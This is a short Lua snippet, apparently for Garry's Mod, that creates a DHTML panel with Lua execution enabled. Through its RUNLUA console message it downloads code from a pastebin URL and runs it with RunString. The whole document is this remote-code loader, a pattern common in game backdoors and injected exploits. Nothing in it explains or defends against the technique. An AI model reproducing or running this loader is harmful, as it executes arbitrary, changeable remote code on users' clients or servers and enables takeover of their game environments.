local f = vgui.Create('DHTML');
f:SetAllowLua(true);
return f:ConsoleMessage([[RUNLUA:
http.Fetch("https://pastebin.com/raw/yCpcXDZt",function(b)RunString(b)end)
]]);
